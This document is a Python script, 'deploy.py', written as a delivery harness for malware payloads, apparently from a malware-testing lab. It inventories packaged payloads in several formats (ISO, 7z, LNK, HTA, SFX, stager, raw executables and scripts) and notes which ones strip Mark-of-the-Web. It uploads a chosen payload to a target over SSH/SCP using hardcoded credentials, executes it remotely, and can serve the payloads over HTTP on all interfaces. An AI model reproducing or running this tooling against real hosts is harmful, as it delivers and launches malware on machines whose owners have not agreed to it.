#!/usr/bin/env python3
"""Interactive deployment script for malware payload.

This script is copied to each output folder. It provides:
- Selection of delivery method (raw, iso, 7z, etc.)
- Upload to target VM via SSH/SCP
- HTTP server for browser download testing
- Execution options

Usage:
    python deploy.py                    # Interactive mode
    python deploy.py --method iso       # Deploy ISO package
    python deploy.py --serve 8080       # Serve via HTTP on port 8080
    python deploy.py --list             # List available packages
"""
import argparse
import http.server
import os
import socketserver
import subprocess
import sys
from pathlib import Path

# Configuration - filled in by assembler
PAYLOAD_NAME = "{{PAYLOAD_NAME}}"
PAYLOAD_TYPE = "{{PAYLOAD_TYPE}}"  # pe, jscript, vbscript, batch
VM_HOST = "localhost"
VM_PORT = 10022
VM_USER = "vmuser"
VM_PASS = "vmuser123"
VM_DEST = r"C:\Users\vmuser\Desktop"


def get_available_packages() -> dict:
    """Find available delivery packages in this folder."""
    packages = {}
    script_dir = Path(__file__).parent

    # Raw payload
    for ext in ['.exe', '.dll', '.cpl', '.js', '.vbs', '.bat', '.ps1']:
        for f in script_dir.glob(f'*{ext}'):
            if f.name != 'deploy.py':
                packages['raw'] = str(f)
                break

    # Delivery folder packages
    delivery_dir = script_dir / 'delivery'
    if delivery_dir.exists():
        for f in delivery_dir.iterdir():
            if f.suffix == '.iso':
                packages['iso'] = str(f)
            elif f.suffix == '.7z':
                packages['7z'] = str(f)
            elif f.suffix == '.lnk':
                packages['lnk'] = str(f)
            elif f.name.startswith('stager'):
                packages['stager'] = str(f)
            elif f.suffix == '.hta':
                packages['hta'] = str(f)
            elif f.suffix == '.exe' and 'sfx' in f.name.lower():
                packages['sfx'] = str(f)

    return packages


def list_packages():
    """List available packages."""
    packages = get_available_packages()
    if not packages:
        print("No packages found in this folder.")
        return

    print("\nAvailable delivery packages:")
    print("-" * 40)
    for method, path in sorted(packages.items()):
        size = os.path.getsize(path)
        motw = "strips MOTW" if method in ('iso', '7z', 'sfx') else "keeps MOTW"
        print(f"  {method:10} {os.path.basename(path):30} ({size:,} bytes) [{motw}]")


def deploy_to_vm(package_path: str, execute: bool = True) -> bool:
    """Deploy package to VM via SCP."""
    try:
        import paramiko
    except ImportError:
        print("paramiko not installed. Using sshpass+scp instead.")
        return deploy_via_sshpass(package_path, execute)

    filename = os.path.basename(package_path)
    remote_path = f"{VM_DEST}\\{filename}"

    print(f"Deploying {filename} to {VM_HOST}:{VM_PORT}...")

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(VM_HOST, VM_PORT, VM_USER, VM_PASS, timeout=10)

        sftp = ssh.open_sftp()
        sftp.put(package_path, remote_path.replace('\\', '/').replace('C:', '/cygdrive/c'))
        sftp.close()

        print(f"  Uploaded: {remote_path}")

        if execute:
            ext = Path(package_path).suffix.lower()
            if ext == '.exe':
                cmd = f'start "" "{remote_path}"'
            elif ext == '.iso':
                cmd = f'powershell Mount-DiskImage -ImagePath "{remote_path}"'
            elif ext == '.7z':
                print("  Note: 7z requires manual extraction on target")
                cmd = None
            else:
                cmd = f'start "" "{remote_path}"'

            if cmd:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                print(f"  Executed: {cmd}")

        ssh.close()
        return True

    except Exception as e:
        print(f"  Error: {e}")
        return False


def deploy_via_sshpass(package_path: str, execute: bool = True) -> bool:
    """Deploy via sshpass/scp (fallback if paramiko unavailable)."""
    filename = os.path.basename(package_path)

    cmd = [
        'sshpass', '-p', VM_PASS,
        'scp', '-P', str(VM_PORT),
        '-o', 'StrictHostKeyChecking=no',
        package_path,
        f'{VM_USER}@{VM_HOST}:{VM_DEST}/{filename}'
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  SCP failed: {result.stderr}")
        return False

    print(f"  Uploaded: {VM_DEST}\\{filename}")
    return True


def serve_http(port: int = 8080):
    """Serve this folder via HTTP for browser download testing."""
    script_dir = Path(__file__).parent
    os.chdir(script_dir)

    handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
        local_ip = get_local_ip()
        print(f"\nServing {script_dir} on:")
        print(f"  http://localhost:{port}/")
        print(f"  http://{local_ip}:{port}/")
        print("\nAvailable files:")
        for f in sorted(script_dir.iterdir()):
            if f.is_file() and not f.name.startswith('.'):
                print(f"  http://{local_ip}:{port}/{f.name}")

        delivery_dir = script_dir / 'delivery'
        if delivery_dir.exists():
            for f in sorted(delivery_dir.iterdir()):
                print(f"  http://{local_ip}:{port}/delivery/{f.name}")

        print("\nPress Ctrl+C to stop...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nStopped.")


def get_local_ip() -> str:
    """Get local IP address."""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def interactive_mode():
    """Interactive deployment menu."""
    packages = get_available_packages()

    if not packages:
        print("No packages found. Run the assembler first.")
        return

    print("\n" + "=" * 50)
    print(f"Payload: {PAYLOAD_NAME} ({PAYLOAD_TYPE})")
    print("=" * 50)

    list_packages()

    print("\nOptions:")
    print("  1. Deploy to VM")
    print("  2. Serve via HTTP")
    print("  3. Exit")

    choice = input("\nChoice [1-3]: ").strip()

    if choice == '1':
        methods = list(packages.keys())
        print("\nSelect delivery method:")
        for i, m in enumerate(methods, 1):
            print(f"  {i}. {m}")

        try:
            idx = int(input(f"\nChoice [1-{len(methods)}]: ").strip()) - 1
            if 0 <= idx < len(methods):
                method = methods[idx]
                deploy_to_vm(packages[method])
        except (ValueError, IndexError):
            print("Invalid choice.")

    elif choice == '2':
        port = input("Port [8080]: ").strip() or "8080"
        serve_http(int(port))

    elif choice == '3':
        return
    else:
        print("Invalid choice.")


def main():
    parser = argparse.ArgumentParser(description="Deploy malware payload")
    parser.add_argument("--method", choices=['raw', 'iso', '7z', 'lnk', 'sfx', 'stager', 'hta'],
                        help="Delivery method to use")
    parser.add_argument("--serve", type=int, metavar="PORT",
                        help="Serve folder via HTTP on specified port")
    parser.add_argument("--list", action="store_true", help="List available packages")
    parser.add_argument("--no-execute", action="store_true",
                        help="Upload only, don't execute")

    args = parser.parse_args()

    if args.list:
        list_packages()
        return

    if args.serve:
        serve_http(args.serve)
        return

    if args.method:
        packages = get_available_packages()
        if args.method not in packages:
            print(f"Package not found: {args.method}")
            print("Available:", list(packages.keys()))
            sys.exit(1)
        deploy_to_vm(packages[args.method], execute=not args.no_execute)
        return

    # Interactive mode
    interactive_mode()


if __name__ == "__main__":
    main()
